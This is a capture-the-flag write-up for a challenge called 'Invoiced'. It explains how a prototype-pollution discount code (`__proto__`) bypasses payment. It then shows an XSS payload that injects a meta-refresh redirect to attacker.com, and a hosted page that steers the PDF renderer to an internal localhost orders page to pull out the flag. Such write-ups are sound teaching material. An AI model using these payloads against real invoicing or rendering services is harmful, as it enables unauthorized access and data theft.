# Invoiced
## Purchasing
Due to a unfortunate mistake on my part, which I discovered too late, the `FREEZTUFSSZ1412` discountcode that I used for testing, was released in the source download. This step was therefore trivially bypassed.
The real challenge assumed that you didn't know it or that there was only a 20% discount.
<details>
  <summary>The solution to that would have been:</summary>
  
  Use the discountcode `__proto__`.

</details>

## Exfiltrating flag
The /renderInvoice used to generate the HTML for the PDF was vulnerable to XSS, but had a CSP to prevent any harm. It was also vulnerable to XSS in the head section, meaning that redirection with META tags could occur.
This allows an attacker to enter a name like:
```
test</title><meta http-equiv="refresh" content="0; url=https://attacker.com">
```
on which a website hosting the following is served:
```html
<html>
    <body>
        <script>document.location.href="http://localhost:5000/orders"</script>
    </body>
</html>
```